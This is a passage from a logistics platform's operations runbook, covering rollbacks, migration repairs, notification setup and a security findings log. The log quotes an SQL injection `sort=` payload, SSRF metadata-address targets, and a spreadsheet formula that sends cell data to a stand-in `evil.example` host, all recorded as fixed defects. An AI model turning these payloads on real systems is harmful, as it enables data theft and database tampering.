Do not re-apply phase 2 until that first query returns `t` **and** a manual
`psql` as `logistics_app` against the target server succeeds.

### Rolling back the cutover

Rollback is a **config** change, not a migration — deliberately, so it needs no
DB write under pressure:

- **AWS:** set `DATABASE_USER` back to `postgres` and `DB_SECRET_ARN` back to
  the master secret (`modules/lambda/main.tf`, `common_env_vars`), and apply.
- **Azure:** set `DATABASE_USER` back to `var.db_user` and `DATABASE_PASSWORD`
  back to the `database-password` secret
  (`modules/container_app/main.tf`, `plain_env` / `secret_env`), apply, and let
  the deploy roll the revisions.

That is the whole rollback. Leaving `logistics_app` able to log in is harmless;
nothing connects as it once `DATABASE_USER` is repointed.

Do **not** `alembic downgrade 059` to roll this back. The downgrade strips
LOGIN, which breaks the app *harder* if anything is still pointed at the role,
and it does nothing that repointing `DATABASE_USER` does not already do.

### What this does NOT protect against

RLS is layer 3 of four. It constrains the **database connection**, so it stops a
query that forgets its `tenant_id` predicate from returning other tenants' rows.
It does not validate JWT claims, check roles, or scope S3 keys — a request
authenticated as the wrong tenant is still scoped to *that* tenant's data.

## Migration 062 refuses to run: duplicate live invoices (2026-11-14)

Migration 062 adds a unique index allowing one non-cancelled invoice per customer per container. If duplicates already
exist it stops with `Cannot enforce one live invoice per customer per container; duplicates exist:` and lists
`tenant / customer / container (N invoices)`. It never merges or cancels money records on its own.

1. For each listed group, open the invoices (the tenant's billing list, filtered by container) and decide which to keep. Keep the one with payments or a release note.
2. Cancel the others with `PATCH /v1/billing/{id}/cancel` (only possible with no confirmed payments and no active release note). If one has payments, move them first — do not delete rows.
3. Re-run `make migrate` / the migrate Lambda. The index excludes cancelled invoices, so it builds once only one live invoice remains per group.

The same migration seeds `tenant_counter` from existing numbers, so invoice numbering continues from the highest number already issued.

## Notification channels — one-time setup before go-live (2026-11-13)

Email, SMS and WhatsApp are wired end to end in code and Terraform, but three
things can only be done by a human with accounts at the providers. Until they
are, each channel **fails silently**: the send path logs "not configured" and
returns, the deploy is healthy, the API returns 200, and customers are never
told anything. `terraform_data.notification_config_guard` (both clouds) fails
the **plan** for prod if the values below are empty, so a prod deploy cannot
reach that state unnoticed — but it cannot check that the accounts behind them
actually work.

### 1. Email

**AWS (SES)** — verify the sending domain (or at least the from-address), then
request removal from the SES sandbox; a sandboxed account can only send to
verified recipients, so customer mail silently fails. Set `ses_from_address`.

**Azure (ACS)** — `module.acs` provisions a managed domain and yields
`DoNotReply@<guid>.azurecomm.net`, which works out of the box. It is
**unreplyable and has poor deliverability**, so before launch add a custom
verified domain and point `acs_sender_address` at it.

Check: `SES_FROM_ADDRESS` must not be empty. The application default
`notifications@logistics.example.com` is a placeholder that both providers
reject; `send_email` refuses to use it in production rather than letting it
surface as a provider error buried in `notification_log`.

### 2. SMS — Africa's Talking

1. Live account + API key → `africastalking_api_key`.
2. **`africastalking_username` must be the live username, not `sandbox`.** The
   application default is `sandbox`, which accepts messages, returns a
   success-shaped response, and delivers nothing. `send_sms` refuses to send as
   `sandbox` in production for exactly this reason.
3. Register a sender ID if you want an alphanumeric sender —
   `africastalking_sender_id`. Nigerian networks commonly require
   pre-registration.

### 3. WhatsApp — Meta Cloud API (the primary customer channel)

SMS is only WhatsApp's fallback, so an unconfigured WhatsApp token means the
main way customers are contacted is dead.

1. Verified Meta Business + WhatsApp Business phone number →
   `meta_whatsapp_access_token`, `meta_whatsapp_phone_id`.
2. **Every template must be approved by Meta under the exact name and language**
   listed in `WA_TEMPLATE_MAP` / `WA_TEMPLATE_MAP_ZH`
   (`services/notification/service.py`). An unapproved name 404s. Set
   `meta_whatsapp_template_lang` to the language they were approved under — `en`
   and `en_US` are different to Meta and a mismatch 404s every send.
3. Subscribe the webhook to `POST /v1/webhooks/whatsapp` on the deployed API,
   using `whatsapp_verify_token` as the verify token. Without it, delivery and
   failure callbacks never arrive, so `notification_log` never progresses past
   `sent` and the SMS fallback on a *late* failure never fires.

### 4. Link base URL — required in every environment

`app_base_url` must be the absolute URL of the deployed app (the Front Door host
on Azure, CloudFront on AWS). Account activation and customer invite links are
built from it, and `shared/app_urls.py` refuses to emit a relative URL — so with
it empty those notifications are **not sent at all** and log an ERROR. Set
`customer_portal_base_url` only if the customer portal is hosted separately.

### 5. Before testing in dev or staging

`NOTIFICATION_ALLOWLIST` fails **closed**: outside production nothing is
messaged unless the contact is listed. This is deliberate — dev and staging
databases hold real imported customer contacts, because a manifest import
creates customers straight from the forwarder's file, phone numbers included.
Add only your own test contacts, comma-separated.

### Diagnosing "the customer says they got nothing"

```sql
SELECT channel, status, error_detail, provider_message_id, created_at
FROM notification_log
WHERE customer_id = '<uuid>'
ORDER BY created_at DESC LIMIT 10;
```

- `status = 'failed'`, `error_detail` mentioning *provider unconfigured* → a
  missing env var, not a provider outage. Check the table in
  `15_api_notifications.md`.
- A `whatsapp` row followed by an `sms` row whose `retry_of` points at it → the
  fallback working as designed.
- **No row at all** for a channel → the message was never enqueued. Either the
  tenant muted that channel (`tenant.notification_preferences`), the recipient
  had no address for it, or the allowlist suppressed it. The producer logs which.
- `status = 'sent'` with an empty `provider_message_id` on a WhatsApp row and a
  `created_at` before 2026-11-13 → the false-`sent` bug: an unconfigured send
  was recorded as delivered and metered. Fixed; such rows are not evidence of
  delivery.

## Rollback Procedure

### Lambda rollback — re-deploy a previous tag

```bash
# Re-tag the last known-good commit as a new patch release
git tag v1.2.4 <prev-sha>
git push origin v1.2.4
```

Or use `workflow_dispatch` with the run ID from a previous successful CI run (see Option B above).

### Lambda rollback — direct AWS CLI (fastest, if artifact is unavailable)

```bash
# Re-deploy a specific service from a previously uploaded zip (if stored in S3):
aws lambda update-function-code \
  --function-name logistics-billing-prod \
  --s3-bucket logistics-artifacts-<account-id> \
  --s3-key previous/billing.zip

# Wait for propagation:
aws lambda wait function-updated --function-name logistics-billing-prod
```

### Terraform rollback

Re-apply the previous infrastructure state:

```bash
cd infrastructure/aws
terraform apply -var-file=environments/prod.tfvars -target=module.lambda
```

### Database rollback

Run an Alembic downgrade **only if** the migration must be reverted. Coordinate with all
service owners before downgrading — code must be rolled back first.

```bash
# Invoke the migration Lambda with a downgrade payload:
aws lambda invoke \
  --function-name logistics-migrate-prod \
  --payload '{"command": "downgrade", "target": "-1"}' \
  /tmp/migrate-out.json
cat /tmp/migrate-out.json
```

Or connect directly via bastion/Session Manager and run:
```bash
alembic -c migrations/alembic.ini downgrade -1
```

**Important:** Migrations must be backward-compatible (additive only). Never drop columns or rename
in the same release as code changes. Use a 2-phase strategy:
- Phase 1: Add new column (nullable), deploy code that writes to both
- Phase 2: Backfill, deploy code reads from new column, drop old column in a follow-up release

---

## Incident Response

### Alarm fired — Lambda Errors > 5 in 5 minutes

1. Check CloudWatch Logs Insights for the affected function:
   ```
   fields @timestamp, @message
   | filter @message like /ERROR/
   | sort @timestamp desc
   | limit 50
   ```
2. Check if a deploy occurred in the last 30 minutes (Actions → Deploy Pipeline)
3. If deploy-related: initiate rollback (see above)
4. If not deploy-related: investigate in logs, page on-call if customer-facing

### Alarm fired — SQS DLQ depth > 0

1. Identify which DLQ: `logistics-{dlq-name}-prod`
2. Check the DLQ message body for the failure reason
3. Fix the root cause, then re-drive messages:
   ```bash
   aws sqs start-message-move-task \
     --source-arn arn:aws:sqs:eu-west-1:<account>:logistics-<name>-dlq-prod \
     --destination-arn arn:aws:sqs:eu-west-1:<account>:logistics-<name>-prod
   ```

### Alarm fired — API Gateway 5xx > 1%

1. Check `logistics-prod-overview` dashboard for which Lambda(s) are erroring
2. Correlate with recent deploys or traffic spikes
3. If deploy-related: rollback; if traffic-related: check Aurora connection alarm

### Alarm fired — Aurora connections > 40

Connection pool (RDS Proxy) is near its limit. Investigate:
1. Check for long-running queries: connect via Session Manager and run `pg_stat_activity`
2. Check for Lambda concurrency spike in CloudWatch
3. If sustained: consider reducing Lambda reserved concurrency temporarily

---

## Security & Reliability Findings Log

Per the SSDLC policy in `CLAUDE.md`, findings and fixes are recorded here.

### 2026-09-23 — full-project debugging pass

| # | Finding | Severity | Status |
|---|---|---|---|
| 0 | **SQL injection via `?sort=`** on `GET /v1/billing`, `/v1/claims`, `/v1/containers`. `shared/pagination.py::build_paginated_query` validated only the segment after the last `.` of the sort field against an allowlist but interpolated the whole string into `ORDER BY`, so `sort=id,(select pg_sleep(5))::text,b.created_at` (or a stacked `id;UPDATE …;--.created_at`) passed as `created_at` and executed — confirmed against Postgres (2.2s vs 0.1s). Reachable by every role that can list, **including customers** (billing list). All other dynamic SQL (46 bandit B608 sites) was audited: constant fragments plus bound parameters — this was the only injectable site. Patched the same day (CRITICAL SLA: 24h). | **CRITICAL** | **Fixed** at the choke point (`fullmatch` of `identifier[.identifier]` + allowlisted column → `422`); `tests/unit/test_sort_injection.py` drives all three endpoints end-to-end with the DB wired to fail. **Because this was live for every deployed build, review `audit_log`/DB logs for unusual `sort=` values if any environment was internet-facing.** |
| 0b | **Unsanitised upload file names** in four presigned-upload flows (claims, manifest evidence, container documents, payment-claim evidence): the raw client `filename` went into the S3 key and, on download, into `Content-Disposition: … filename="{name}"` — a `"` breaks out of the quoted string, and a bidi-override character spoofs the extension staff see. S3 keys are literal so `../` did not traverse tenants (every key still starts with the caller's `tenant_id`; downloads also re-check the prefix). | LOW–MEDIUM | **Fixed** — `shared.validation.safe_filename()` at upload and again at download (legacy rows). 33 tests. |
| 0c | **Dependency advisories.** `safety` reports 6 advisories against the pinned `cryptography==46.0.5` (X.509 path-building DoS `CVE-2026-69249`, improper certificate validation `CVE-2026-69248` / `CVE-2026-34073`, non-contiguous-buffer overflow `CVE-2026-39892`, RSA PKCS#1 v1.5 Bleichenbacher oracle `CVE-2026-69247`, an information-disclosure advisory); the fixed release covering all of them is **≥ 50.0.0**. Exposure here looks low: the app uses `cryptography` for Fernet field encryption (`shared/encryption.py`) and, via PyJWT, RS256 signature *verification* — not X.509 chain validation (TLS is the stdlib `ssl`) or RSA decryption. `npm audit --omit=dev`: 2 moderate `react-router` advisories (open redirect via backslash in `<Link>`/`useNavigate`; SSR-only constructor injection) — not reachable: every `navigate()`/`<Navigate>` target is a fixed path, a role-home mapping or a server-issued id (no `?next=`/`returnTo`), and the app is an SPA. | MEDIUM (unassessed by the tool; low exposure) | **FIXED (2026-10-08):** bumped `cryptography==46.0.5 → 50.0.2` in `requirements.txt` + `requirements-layer.txt` (≥50.0.0 clears the binding CVE-2026-69247 and all six); `safety check` now reports 0. Encryption round-trip + Key Vault wrap/unwrap tests pass on 50.0.2. **Verified safe to take:** in a clean virtualenv with the exact pins, the full backend suite passes (1141) on `46.0.5` *and* with `cryptography==50.0.1` (`pip check` clean, Fernet round-trip OK) — the applied pin is `cryptography==50.0.2`. (`safety` reads `requirements.txt`, so it will keep reporting until the pin moves.) For the frontend, `react-router-dom` ^6.28 → the fixed line is a major bump; schedule it deliberately. Also note `PyJWT` is imported by `services/authorizer` and `services/tenant_management/impersonation.py` but is not in `requirements.txt` — add it (pinned) when the authorizer is adopted (finding: Open decisions #3). |
| 1 | **SSRF in tenant webhooks.** `webhook_config.endpoint_url` was validated only by `^https://` and fetched with `urllib` from inside the VPC: reachable targets included `https://169.254.169.254/…`, RFC1918 addresses (Aurora/Redis/RDS Proxy), `https://localhost/…`, hostnames resolving to those, and public servers redirecting to them; `POST /v1/tenant/config/webhook/test` echoed raw connect errors (internal port-scan oracle). Requires a tenant_admin account. | HIGH | **Fixed** — `shared/url_safety.py` (save-time validator, delivery-time DNS check, pinned-IP connection, no redirects). 70 new tests. Previously-saved internal URLs are inert because delivery re-checks. |
| 2 | **~80 served routes absent from API Gateway** (every `/v1/notifications/*`, warehouses, CBM rate, PDFs, quota, plans, Paystack config, container documents, bulk packing-list actions, …). Worked locally, would 404 in AWS. | HIGH (functional) | **Fixed** — declared in `modules/api-gateway/main.tf`; guarded by `test_infrastructure_contracts.py`. |
| 3 | **All notification Lambdas pointed at a nonexistent handler** (`notification.handler.lambda_handler`) → `Runtime.HandlerNotFound` on every invocation. | HIGH (functional) | **Fixed** — per-channel handlers; contract test added. |
| 4 | **Notifications could never be enqueued in AWS**: `SQS_*_QUEUE_URL` env vars unset (messages silently dropped) and no Lambda role had `sqs:SendMessage`. | HIGH (functional) | **Fixed** — `queue_urls` wired through; `sqs_send_notifications` policy. |
| 5 | **Permissions boundary would have denied all field-level KMS encryption** (`kms:RequestAlias` condition can't match a key-ARN `GenerateDataKey` or a keyless `Decrypt`) → PII (pickup ID numbers, refund bank details) and per-tenant Paystack keys unreadable/unwritable. | HIGH (functional) | **Fixed** — `kms:ResourceAliases`. **Verify after apply** with `aws iam simulate-principal-policy`. |
| 6 | IAM gaps: S3 for tracking/payment_release/manifest/excel (presigned URLs), tenant offboarding purge (S3 versions + Cognito), 6 Cognito admin actions used by `cognito_client.py`, KMS for `tenant_management`. | MEDIUM (functional) | **Fixed** (role policies + boundary). |
| 7 | `GET /v1/platform/tenants/{id}/usage` silently dropped: `metering` never exposed to API Gateway (`active_routes` filter has no error). | MEDIUM | **Fixed.** |
| 8 | `npm run build` (`tsc -b`) failed on 4 type errors — production frontend build was broken. | MEDIUM | **Fixed.** |
| 9 | `TenantReports` had no request cancellation: changing the date range mid-flight let a slower stale response overwrite the newer one. | LOW | **Fixed.** |
| 10 | Tenant-isolation tests had rotted (4 failing) — the suite meant to prove `tenant_id` scoping wasn't running green. | MEDIUM | **Fixed.** |
| 11 | 89 ruff / 31 mypy findings, incl. an unguarded `None` dereference in the payment-verify race path. | LOW | **Fixed.** |

**Verified live** against the real local stack with real seeded data (not just unit tests): every injection payload
(staff, **customer**, stacked statement, claims, containers) returns `422` in ~0.0s with nothing executed and no rows
tampered; legitimate `?sort=` still returns data; the four SSRF targets are refused at save; a legitimate public
webhook saves and the real `webhook/test` endpoint delivers through the hardened opener (`200`); all 50 migrations run
cleanly from an empty database; `make check` (ruff/mypy) and 1141 backend + 799 frontend unit tests are green.

All fixes are covered by tests except the AWS-side behaviour (findings 2–7), which is asserted structurally and by
`terraform validate` but has **not been through `terraform plan`/`apply`**.

### Open infrastructure decisions (not changed — need an owner)

1. **Outbound internet egress from the VPC.** The VPC has no NAT ("no NAT in v1", `modules/networking`); only S3
   (gateway) and SQS, EventBridge, SES-SMTP, Secrets Manager, Logs, Cognito-IDP, KMS (interface) endpoints exist.
   VPC-attached Lambdas therefore cannot reach: **Paystack** (`payment_release` initialize/verify,
   `tenant_management` test-connection — online payment would fail), **Bybit** (`billing` FX rate — degrades to the
   persisted fallback), and, if the notification consumers were moved into the VPC, **Africa's Talking** and
   **Meta**. Options: (a) one NAT Gateway (~$32/month + data) and move the consumers into the VPC — restores
   `notification_log` + metering writes; (b) keep consumers outside the VPC and decouple their DB writes through a
   queue consumed by a VPC Lambda; (c) a small non-VPC egress-proxy Lambda for Paystack/Bybit. Recommendation: (a)
   — a single dependency-free fix, and Paystack cannot be done any other cheap way.
2. **Notification consumers and the database.** Until (1) is decided, `notif-sms|whatsapp|email` still send but their
   `notification_log`/metering writes fail after 5s each; with `batch_size = 10` and a 60s timeout, a slow batch can be
   redelivered (duplicate sends). Interim mitigation **applied**: `batch_size = 1` on the three notification event-source mappings (raise back to 10 once the consumers have DB access).
3. **Custom Lambda authorizer not adopted.** `services/authorizer/handler.py` (Cognito JWT *and* ShipX impersonation
   tokens) is documented but not wired; API Gateway still uses the native JWT authorizer, which rejects HS256
   impersonation tokens, so platform-admin impersonation cannot work in AWS. Requires the checklist at the top of
   that file plus an `IMPERSONATION_SECRET` Secrets Manager secret (also needed by `tenant_management` to sign).
4. **Provider credentials are unprovisioned.** `AFRICASTALKING_API_KEY|USERNAME|SENDER_ID`, `META_WHATSAPP_PHONE_ID|
   ACCESS_TOKEN`, `WHATSAPP_VERIFY_TOKEN`, `SES_FROM_ADDRESS` are read from env vars no Terraform sets. Provision via
   Secrets Manager (per `00_CROSS_CUTTING_STANDARDS.md` §8.1) before go-live.
5. **Lambdas connect to Aurora as `postgres`, not the RLS role — verify RLS is actually enforced in AWS.**
   Migration 005 creates `logistics_app` and applies `FORCE ROW LEVEL SECURITY` so tenant isolation is enforced by
   PostgreSQL itself (defence layer 3), but `modules/lambda` sets `DATABASE_USER = "postgres"` for every Lambda (and the
   migrate Lambda). On RDS/Aurora the master user is typically created with `BYPASSRLS`, in which case RLS is inert
   and isolation rests only on the application's `tenant_id` predicates — meaning an injection or a missed predicate
   (like finding #0) would not be contained by the database. Check with
   `SELECT rolname, rolbypassrls FROM pg_roles WHERE rolname IN ('postgres','logistics_app');` on the real cluster;
   if `postgres` bypasses, connect the API Lambdas as `logistics_app` (rotate the placeholder password in migration
   005 into Secrets Manager first) and keep `postgres` for migrations only. Not changed here: it needs the RDS Proxy
   auth configuration and a real credential, neither of which can be verified locally.
6. **Frontend bundle is a single 937 kB chunk (258 kB gzip)** — every page, including the marketing landing page and
   login, ships together. Route-level `React.lazy` code-splitting would cut first load materially for the
   mobile-heavy Nigerian audience. Not a bug; recorded because the responsive pass made mobile first-load matter more.

### 2026-10-17 — the recipient guard could never switch off in production

**Severity: HIGH (latent, pre-release).** `shared/notifications.is_recipient_allowed`
gated "always send" on `ENVIRONMENT.lower() == "production"`, but **no environment
anywhere sets that string** — every tfvars file on both clouds uses
`environment = "prod"` (plus `staging`/`dev`/`demo`), and both
`infrastructure/aws/modules/lambda` and the Azure `container_app` module pass
`ENVIRONMENT = var.environment` straight through. The guard therefore fails
closed in **production** as well, suppressing *every* customer notification —
shipment updates, payment-due notices, release notes — with nothing but a
`WARNING` line to show for it. `environment` also feeds resource name prefixes,
so it cannot simply be renamed to `"production"` without recreating
infrastructure.

Found while wiring `NOTIFICATION_ALLOWLIST` for Azure (until then `ENVIRONMENT`
was unset on the containers, so the mismatch was masked by the guard blocking
everything regardless). Fixed by accepting both spellings via
`_PRODUCTION_ENVIRONMENTS = {"production", "prod"}`; `demo`/`staging`/`dev` keep
failing closed. Regression tests in `tests/unit/test_notification_guard.py`
assert `prod` sends, that it is case/whitespace tolerant, and that the other
environments (including a near-miss like `productionish`) still suppress.

**Before go-live:** confirm a real notification actually sends from production —
the failure mode here is silence, not an error.

## Severity SLA

| Severity | Patch Within |
|---|---|
| CRITICAL | 24 hours |
| HIGH | 72 hours |
| MEDIUM | 2 weeks |
| LOW | Next sprint |

See Architecture Decision Records in `docs/adr/` for system design context.

## Migration 063 downgrade refuses: refunds use the new types (2026-11-14)

Migration 063 widens `refund_request.refund_type` to include `missing_item` and `seized_item` and adds
`storage_fee_log.waived_at`. Downgrading re-creates the old three-value CHECK, which fails if any refund already uses the new
types. Do not delete those rows to get past it: they are real compensation requests. Either stay on 063, or re-point them
(`UPDATE refund_request SET refund_type = 'damage_or_loss' WHERE refund_type IN ('missing_item','seized_item')`) after
agreeing that with finance, then downgrade. Dropping `waived_at` loses which storage fees were waived (the totals already
reflect the waiver; the history does not survive).

## Rate limiting, origin checks and user revocation (audit Phase 2, 2026-11-15)

**Alarm hook: `rate_limiter_unavailable`.** `shared/rate_limit.py` logs this at ERROR, at most once per 30 s per process, when Redis cannot be reached. The limiter **fails open**, so nothing is down: protection is off for as long as Redis is. Create a CloudWatch log metric filter on that string and alarm on it (this is the OPS-04 hook). Fix Redis (ElastiCache / Azure Cache); counters restart empty and limiting resumes by itself within about 5 seconds (the circuit breaker in `DistributedCache`).

**Users report `429 RATE_LIMIT_EXCEEDED`.** Read `Retry-After`. Which policy? The log line `Rate limit exceeded (policy=..., key=...)` names it. Usual cause is a shared office or mobile-carrier address hitting a per-address limit (`session_ip` 60/min, `tracking_ip` 30/min). Raise it with `RATE_LIMIT_<POLICY>=limit/window` on the affected Lambda or container app, or switch the limiter off with `RATE_LIMIT_ENABLED=false` in an emergency. `RATE_LIMIT_TENANT` (default 600/min) is a guess; tune it from the `api_calls` usage metric. To clear one client's counter: delete the matching `ratelimit:*` key in Redis (keys are hashed, so find it by `redis-cli --scan --pattern 'ratelimit:login_failures:*'` and a known account's behaviour, or flush the policy's keys).

**A tracking code is locked ("429" with a 1 hour `Retry-After`).** Ten wrong phone guesses lock the *code*, for every address, for an hour. That is by design (the phone is the only secret) and can be used to deny one code to its owner. Clear it by deleting the code's `ratelimit:tracking_failures:*` keys.

**Everyone's sign-in or refresh returns `403 ORIGIN_NOT_ALLOWED`.** The auth Lambda found no trusted origin, or not this one. It trusts the origins of `APP_BASE_URL`, `CUSTOMER_PORTAL_BASE_URL`, `ENTRA_REDIRECT_URI`, and `ALLOWED_ORIGINS` / `CORS_ALLOW_ORIGINS`. After a Terraform change confirm `ALLOWED_ORIGINS` and `APP_BASE_URL` are on the function. With none set it refuses everything and logs `No trusted origin is configured` at ERROR. Do not "fix" it by removing the check.

**Azure: audit logs show no IP, or per-address rate limits do not seem to apply.** The app takes the client address from Front Door's own stamp, and only on requests that carry this deployment's Front Door id (`X-Azure-FDID` equal to `AZURE_FRONT_DOOR_ID`, which Terraform sets from the Front Door profile). Check, in order: (1) the container app has `AZURE_FRONT_DOOR_ID` set (empty means Front Door is not deployed, `enable_frontend = false`); (2) the request really went through the Front Door host, not the container app's own `*.azurecontainerapps.io` hostname: a request that goes around Front Door is served but its address is deliberately unknown; (3) do one audited action (sign in) through the Front Door host and look at that row's `ip_address` in the activity log: it should be your public address. If it is empty there, Front Door is not sending `X-Azure-SocketIP` in the form expected (a bare IPv4 or IPv6 address); `shared/client_ip.py::resolve_edge_client_ip` is the one place to adjust. There is no hop count to tune; `TRUSTED_PROXY_HOPS` stays 0.

**Closing the way around Front Door (optional, free).** Set `require_front_door = true` and apply: the API then answers 403 to anything that did not come through this Front Door (`/health` stays open for the platform's probes). Before turning it on, make sure every externally configured URL uses the Front Door host: the Paystack webhook, the WhatsApp webhook, and any smoke test in the deploy workflow. It rests on the Front Door id, which is not public but is not a secret either; the stronger lock is Front Door Premium with Private Link (about ten times the monthly base price of Standard), which is not worth it at this size.

**A deactivated user still has access.** They should not: the very next request gets 401. If one does, check Redis for a stale `identity:<user id>` entry (deactivation evicts it; the TTL is 60 s) and that the `tenant_user` row says `deactivated`. A request returning `503 Service Unavailable` with "User status check unavailable" means the lookup failed and the user check failed closed.

**Migration 064** adds the `suppressed` status to `notification_log`. Its downgrade refuses while any suppressed row exists; do not delete those rows, they are the record of why a customer was not messaged.

**Erasing a customer is irreversible at the identity provider (2026-11-16).** `DELETE /v1/customers/{id}` deletes the customer's Cognito/Entra account and replaces their `tenant_user` email and name with placeholders. There is no undo; the row stays, deactivated, for FK integrity. If it returns `502` the provider call failed and nothing was erased; retry.

## Spreadsheet formula injection in exports (2026-11-16)

**Finding (MEDIUM, patch within 2 weeks): customer-typed text can run as a spreadsheet formula.** Anyone can self-register as a customer (`/register/{slug}`) and choose their own name. The single-record exports write that name, and other typed text (goods descriptions, vessel names), into the file as raw text: openpyxl turns an xlsx string that starts with `=` into a formula, and a csv cell that starts with `=`, `+`, `-` or `@` is read as one by Excel (CWE-1236). A customer registering as `=HYPERLINK("https://evil.example/?"&A2,"Click")` therefore plants a formula in any staff export that includes them.

**Fixed (2026-11-16):** the two new list exports (`GET /v1/billing/export`, `GET /v1/containers/export`) write text as text (`services/excel/_tables.py`; tests in `tests/unit/test_list_exports.py`, mutation-checked).

**Closed (2026-11-16, same day):** the older exports are fixed too. `export_billing.py`, `export_manifest.py` and `export_packing_list.py` call `_tables.neutralise_formulas(workbook)` before saving (none of them writes a formula on purpose, so any formula cell is typed-in text), and `service._rows_to_csv` (the customer's "Download invoice" among others) passes each value through `_tables.csv_safe`, which prefixes text that starts with `=`, `+`, `-`, `@`, tab or carriage return with an apostrophe and leaves numbers alone, so a negative balance held as a number is not touched. Tests: `tests/unit/test_export_formula_safety.py` (mutation-checked). The PDF exports are not spreadsheets and are unaffected. A new exporter must use `_tables.build_xlsx` / `build_csv`, or call these two helpers.

## Pickup codes (audit UX-09, 2026-11-16, ADR-008)

**"The warehouse says the pickup code is wrong."** The collector must give the six digit code sent to the customer by SMS and email when the release note was issued. Each wrong try is counted; the error says how many are left.

**"The release note is locked."** Five wrong codes. Office staff (Nigeria staff or tenant admin) open the release note and use **Send new pickup code**; the customer gets a new code, the old one stops working and the note unlocks. Staff are notified in app when a note locks. Nobody at the company can read a code.

**"The customer never got a code."** Check the notification log for `pickup_code_issued` (the code shows as ••••••). A failed one cannot be retried; send a new code from the release note. If the customer has no phone or email on file the note has no code and needs none.

**Dev and staging:** outside production the notification guard only messages contacts on `NOTIFICATION_ALLOWLIST`. With `PICKUP_CODE_PEPPER` set, a test customer must be on the allowlist to receive a code, otherwise a pickup for a note with a code cannot be completed. Local dev has no pepper unless you set one, so no codes are issued.

**Do not rotate `PICKUP_CODE_PEPPER`** without planning: every outstanding code stops verifying and each active note needs a new code. If a note carries a code and the pepper is missing, pickups for it return 503 by design.

**Migration 065** adds three columns to `release_note`. It has not been run anywhere yet.

## Invoices with a negative total (audit BE-07, 2026-11-17, migration 066)

**Background.** Until 2026-11-17 invoice generation subtracted all of a customer's credit from their next invoice, so a customer with more credit than the charge got a negative invoice and lost the difference. New invoices cannot go below zero: the code stops at zero and the table has `ck_billing_total_not_negative`.

**After running migration 066**, check its log. If it says `N invoice(s) have a negative total`, the constraint is active for new and changed rows but not validated, and **those N invoices cannot be updated** until repaired (any update fails the check).

Find them:

```sql
SELECT b.tenant_id, b.id, b.invoice_number, b.customer_id, b.total_ngn, b.amount_paid_ngn, b.status, b.billed_at
  FROM billing b WHERE b.total_ngn < 0 ORDER BY b.billed_at;
```

Each one is a decision about a customer's money, so it is made by the tenant's finance owner, not by a script. The usual repair, per invoice, in one transaction: give the amount below zero back to the customer as credit, then bring the invoice to zero.

```sql
BEGIN;
-- 1. A credit for the amount the invoice is below zero (here 30000.00), already approved.
INSERT INTO refund_request (tenant_id, customer_id, billing_id, amount_ngn, amount_approved_ngn, reason, status,
                            refund_type, customer_choice)
VALUES (:tenant_id, :customer_id, :billing_id, 30000.00, 30000.00,
        'Credit left over from invoice :invoice_number (BE-07 repair)', 'applied_as_credit', 'overpayment',
        'credit_next_shipment');
-- 2. The invoice itself owes nothing.
UPDATE billing SET total_ngn = 0, status = 'paid', updated_at = NOW()
 WHERE tenant_id = :tenant_id AND id = :billing_id AND total_ngn < 0
RETURNING id;
COMMIT;
```

Record each repair in the tenant's audit trail (who decided, the invoice, the amount). When no negative rows remain:

```sql
ALTER TABLE billing VALIDATE CONSTRAINT ck_billing_total_not_negative;
```

**If an update to an invoice fails with `ck_billing_total_not_negative`** in normal running, it is one of those unrepaired rows. No code path can create a new one: `shared.billing_money.adjust_billing` stops at zero.

## A Paystack charge that was not applied (audit BE-08, 2026-11-17)

Since 2026-11-17 a Paystack charge is applied to an invoice only if it is a positive amount in naira. Anything else is acknowledged (200) and logged at WARNING by `services/payment_release/paystack.py`:

```
Ignoring Paystack charge '<id>': currency 'USD' is not NGN
Ignoring Paystack charge '<id>': amount is not positive
```

On the verify path the customer sees "This payment was not made in naira, so it has not been applied to your invoice. Please contact the office." (422 `BR-PAY-VERIFY-002`).

**What to do.** A charge in another currency means the tenant's Paystack account accepts that currency and a checkout was opened in it, or someone sent a crafted event signed with the tenant's key (which means the key has leaked: rotate it in the tenant's Paystack dashboard and `PUT /v1/tenant/config/paystack`). Look the transaction id up in the tenant's Paystack dashboard. If the customer really paid, either refund it in Paystack or record the naira value by hand as a payment (`POST /v1/payments`, method `paystack`, with the Paystack reference) after agreeing the rate with the tenant. Do not change the code to accept it.

## AWS Lambdas pointed at the wrong bucket (found 2026-11-17)

**Severity: HIGH on AWS, before go-live; not applicable on Azure** (Azure sets `BLOB_CONTAINER_NAME`, which the code reads). The Lambda environment set `S3_BUCKET`; the code reads `S3_BUCKET_NAME` and falls back to `logistics-assets`. S3 bucket names are global, so on AWS every presigned upload, download and export pointed at a bucket this deployment does not own: uploads would fail with AccessDenied, or, if that name is ever registered by someone with a permissive policy, land in their bucket. Separately, the 90-day cleanup read `TENANT_DATA_BUCKET`, which nothing set, so it never purged a deleted tenant's files.

**Fixed:** `S3_BUCKET_NAME = var.bucket_name` in `modules/lambda` (`common_env_vars`); cleanup purges the assets bucket unless `TENANT_DATA_BUCKET` overrides it. Contract tests: `TestStorageSettingsReachTheCode`. **To do on the next AWS apply:** confirm one presigned upload lands in `{project}-assets-{env}-{account}`. If an AWS environment ran before this fix, check whether any tenant was purged by cleanup: its files are still in the bucket and must be deleted by hand (`aws s3 rm s3://<bucket>/<tenant_id>/ --recursive`, plus non-current versions).

## Offboarding export failed (audit BE-10, 2026-11-17)

The platform tenant page shows "Every attempt failed" when an export failed 3 times. The job logs `Offboarding export <id> failed for tenant <tenant_id>: <ExceptionType> at <file>:<line>` (no message, by design: it handles every customer's personal data). `tenant_offboarding_export.last_error` holds the same type name.

| Type | Usual cause | Fix |
|---|---|---|
| `InvalidToken`, `ClientError` from KMS | a field cannot be decrypted (key policy, disabled key, or a value written without encryption under a different key) | check the job role has `kms:Decrypt` on `ENCRYPTION_KMS_KEY_ID`; on Azure, the identity's Key Vault access |
| `ClientError` / `HttpResponseError` from storage | the job cannot write to `{tenant_id}/exports/offboarding/` | IAM `offboarding_export` policy; on Azure, the storage connection |
| `MemoryError`, or the Lambda times out | a very large tenant | raise the Lambda memory (`modules/lambda`, `scheduled_configs.offboarding_export`); the archive is built in memory |
| `TypeError: cannot export a …` | a column type the exporter does not know | add it to `_json_value` in `services/scheduled/offboarding_export.py` |

After the fix, press **Queue export** on the tenant page (or `POST /v1/platform/tenants/{id}/offboarding-export`). It runs at the next hour.

## A tenant past 90 days was not deleted

